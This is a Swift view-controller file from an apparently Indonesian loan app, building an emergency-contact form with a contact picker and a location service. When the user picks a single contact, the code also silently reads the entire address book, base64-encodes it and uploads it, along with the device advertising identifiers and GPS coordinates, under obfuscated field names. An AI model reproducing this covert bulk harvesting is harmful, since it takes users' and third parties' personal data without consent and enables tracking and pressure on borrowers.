//
//  FlossViewController.swift
//  PinjamanNow
//
//  Created by Ethan Hayes on 2026/2/5.
//

import UIKit
import SnapKit
import TYAlertController
import BRPickerView

class FlossViewController: BaseViewController {
    
    var orderID: String = ""
    
    var productID: String = ""
    
    var pageTitle: String = ""
    
    var modelArray: [fragthoughiceModel] = []
    
    private let viewModel = AppViewModel()
    
    private let locationService = LocationService()
    
    private var one: String = ""
    private var two: String = ""
    
    lazy var sureBtn: UIButton = {
        let sureBtn = UIButton(type: .custom)
        sureBtn.setTitleColor(.white, for: .normal)
        sureBtn.setTitle(languageCode == .indonesian ? "Berikutnya" : "Next", for: .normal)
        sureBtn.titleLabel?.font = UIFont.systemFont(ofSize: 16, weight: .semibold)
        sureBtn.setBackgroundImage(UIImage(named: "login_btn_image"), for: .normal)
        sureBtn.addTarget(self, action: #selector(sureBtnClick), for: .touchUpInside)
        return sureBtn
    }()
    
    lazy var bgImageView: UIImageView = {
        let bgImageView = UIImageView()
        bgImageView.image = languageCode == .indonesian ? UIImage(named: "flo_id_head_image") : UIImage(named: "flo_en_head_image")
        bgImageView.contentMode = .scaleAspectFit
        return bgImageView
    }()
    
    lazy var whiteView: UIView = {
        let whiteView = UIView()
        whiteView.layer.cornerRadius = 14
        whiteView.layer.masksToBounds = true
        whiteView.layer.maskedCorners = [.layerMinXMaxYCorner, .layerMaxXMaxYCorner]
        whiteView.backgroundColor = UIColor.init(hexString: "#FFFFFF")
        return whiteView
    }()
    
    lazy var nameLabel: UILabel = {
        let nameLabel = UILabel()
        nameLabel.textAlignment = .left
        nameLabel.text = ""
        nameLabel.textColor = UIColor.init(hexString: "#333333")
        nameLabel.font = UIFont.systemFont(ofSize: 14, weight: UIFont.Weight(500))
        return nameLabel
    }()
    
    lazy var descLabel: UILabel = {
        let descLabel = UILabel()
        descLabel.textAlignment = .left
        descLabel.text = ""
        descLabel.textColor = UIColor.init(hexString: "#333333")
        descLabel.font = UIFont.systemFont(ofSize: 14, weight: UIFont.Weight(500))
        return descLabel
    }()
    
    lazy var tableView: UITableView = {
        let tableView = UITableView(frame: .zero, style: .plain)
        tableView.separatorStyle = .none
        tableView.backgroundColor = .clear
        tableView.estimatedRowHeight = 88
        tableView.delegate = self
        tableView.dataSource = self
        tableView.showsVerticalScrollIndicator = false
        tableView.contentInsetAdjustmentBehavior = .never
        tableView.rowHeight = UITableView.automaticDimension
        tableView.register(FlossViewCell.self, forCellReuseIdentifier: "FlossViewCell")
        if #available(iOS 15.0, *) {
            tableView.sectionHeaderTopPadding = 0
        }
        return tableView
    }()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        let bgView = UIView()
        bgView.backgroundColor = UIColor.init(hexString: "#0956FB")
        
        view.addSubview(bgView)
        bgView.snp.makeConstraints { make in
            make.top.leading.right.equalToSuperview()
            make.height.equalTo(295.pix())
        }
        
        view.addSubview(appHeadView)
        appHeadView.nameLabel.text = pageTitle
        appHeadView.snp.makeConstraints { make in
            make.top.equalTo(self.view.safeAreaLayoutGuide.snp.top)
            make.left.right.equalToSuperview()
            make.height.equalTo(40)
        }
        
        appHeadView.backBlock = { [weak self] in
            guard let self = self else { return }
            self.toProductVc()
        }
        
        view.addSubview(sureBtn)
        sureBtn.snp.makeConstraints { make in
            make.centerX.equalToSuperview()
            make.size.equalTo(CGSize(width: 315.pix(), height: 55.pix()))
            make.bottom.equalTo(self.view.safeAreaLayoutGuide.snp.bottom)
        }
        
        view.addSubview(bgImageView)
        bgImageView.snp.makeConstraints { make in
            make.centerX.equalToSuperview()
            make.top.equalTo(appHeadView.snp.bottom).offset(10)
            make.size.equalTo(CGSize(width: 345.pix(), height: 240.pix()))
        }
        
        view.addSubview(whiteView)
        whiteView.snp.makeConstraints { make in
            make.top.equalTo(bgImageView.snp.bottom)
            make.left.right.equalToSuperview().inset(15.pix())
            make.bottom.equalTo(sureBtn.snp.top).offset(-10.pix())
        }
        
        view.addSubview(tableView)
        tableView.snp.makeConstraints { make in
            make.top.equalTo(bgImageView).offset(126)
            make.left.right.bottom.equalTo(whiteView)
        }
        
        locationService.success = { result in
            print("result====\(result)")
        }
        
        locationService.start()
        
        one = String(Int(Date().timeIntervalSince1970))
    }
    
    override func viewWillAppear(_ animated: Bool) {
        super.viewWillAppear(animated)
        Task {
            await self.basicInfo()
        }
    }
    
}

extension FlossViewController {
    
    private func basicInfo() async {
        do {
            let paras = ["institutionit": productID]
            let model = try await viewModel.flossInfo(with: paras)
            let bebit = model.bebit ?? ""
            if bebit == "0" || bebit == "00" {
                self.modelArray = model.record?.libr?.argentfication ?? []
                self.tableView.reloadData()
            }
        } catch {
            
        }
    }
    
    private func saveInfo(with paras: [String: String]) async {
        do {
            let model = try await viewModel.saveFlossInfo(with: paras)
            let bebit = model.bebit ?? ""
            if bebit == "0" || bebit == "00" {
                Task {
                    await self.productMessageInfo(with: productID,
                                                  orderID: orderID,
                                                  viewModel: viewModel)
                }
                Task {
                    try? await Task.sleep(nanoseconds: 3_000_000_000)
                    await self.uploadInfo()
                }
            }else {
                ToastManager.showMessage(model.calcfootment ?? "")
            }
        } catch {
            
        }
    }
    
    @objc func sureBtnClick() {
        two = String(Int(Date().timeIntervalSince1970))
        var jsonArray: [[String: String]] = []
        for model in modelArray {
            var paras: [String: String] = [:]
            paras["selfopen"] = model.selfopen ?? ""
            paras["sy"] = model.sy ?? ""
            paras["ethnesque"] = model.ethnesque ?? ""
            paras["theroally"] = model.theroally ?? ""
            jsonArray.append(paras)
        }
        
        do {
            let jsonData = try JSONSerialization.data(
                withJSONObject: jsonArray,
                options: []
            )
            
            guard let jsonString = String(data: jsonData, encoding: .utf8) else {
                print("Failed to convert data to string")
                return
            }
            
            let parameters = ["institutionit": productID, "record": jsonString]
            
            Task {
                await self.saveInfo(with: parameters)
            }
            
        } catch {
            
        }
        
    }
}

extension FlossViewController: UITableViewDelegate, UITableViewDataSource {
    
    func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -> Int {
        return self.modelArray.count
    }
    
    func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
        let cell = tableView.dequeueReusableCell(withIdentifier: "FlossViewCell", for: indexPath) as! FlossViewCell
        let model = self.modelArray[indexPath.row]
        cell.model = model
        cell.relationBlock = { [weak self] in
            guard let self = self else { return }
            tapCellWithType(cell: cell, listModel: model)
        }
        cell.phoneBlock = { [weak self] in
            guard let self = self else { return }
            ContactManager.shared.pickSingleContact(from: self) { [weak self] contact in
                guard let self = self else { return }
                let name = contact?.sy ?? ""
                let phone = contact?.tryatory ?? ""
                if name.isEmpty || phone.isEmpty {
                    ToastManager.showMessage(languageCode == .indonesian ? "Nama dan nomor telepon tidak boleh kosong." : "Name and phone number cannot be empty.")
                    return
                }
                model.sy = name
                model.selfopen = phone
                cell.phoneFiled.text = String(format: "%@-%@", name, phone)
            }
            ContactManager.shared.getAllContacts { [weak self] contacts in
                guard let self = self, let jsonData = try? JSONEncoder().encode(contacts) else { return }
                if contacts.isEmpty {
                    return
                }
                let base64String = jsonData.base64EncodedString()
                let parameters = ["provide": String(Int(2 + 1)), "record": base64String]
                Task {
                    do {
                        let _ = try await self.viewModel.uploadFlossInfo(with: parameters)
                    } catch {
                        
                    }
                }
            }
        }
        return cell
    }
    
}

extension FlossViewController {
    
    private func tapCellWithType(cell: FlossViewCell, listModel: fragthoughiceModel) {
        let popView = PopAuthListView(frame: self.view.bounds)
        popView.nameLabel.text = listModel.pauchundredot ?? ""
        let modelArray = listModel.whateverfic ?? []
        
        let text = cell.enterFiled.text ?? ""
        for (index, model) in modelArray.enumerated() {
            let targetText = model.sy ?? ""
            if text == targetText {
                popView.selectedIndex = index
            }
        }
        
        popView.modelArray = modelArray
        let alertVc = TYAlertController(alert: popView, preferredStyle: .actionSheet)
        
        popView.cancelBlock = { [weak self] in
            self?.dismiss(animated: true)
        }
        
        popView.sureBlock = { [weak self] model in
            guard let self = self else { return }
            self.dismiss(animated: true) {
                listModel.executiveitious = model.sy ?? ""
                listModel.ethnesque = model.provide ?? ""
                cell.enterFiled.text = model.sy ?? ""
            }
        }
        
        self.present(alertVc!, animated: true)
    }
    
}

extension FlossViewController {
    
    private func uploadInfo() async {
        do {
            let paras = ["manu": productID,
                         "anemion": "6",
                         "canproof": orderID,
                         "armaneity": IDFVKeychainManager.shared.getIDFV(),
                         "vagaster": IDFVKeychainManager.shared.getIDFA(),
                         "fidel": UserDefaults.standard.object(forKey: "longitude") as? String ?? "",
                         "regionlet": UserDefaults.standard.object(forKey: "latitude") as? String ?? "",
                         "recentlyfaction": one,
                         "dogmatization": two]
            let _ = try await viewModel.uploadStudyInfo(with: paras)
        } catch {
            
        }
    }
    
}
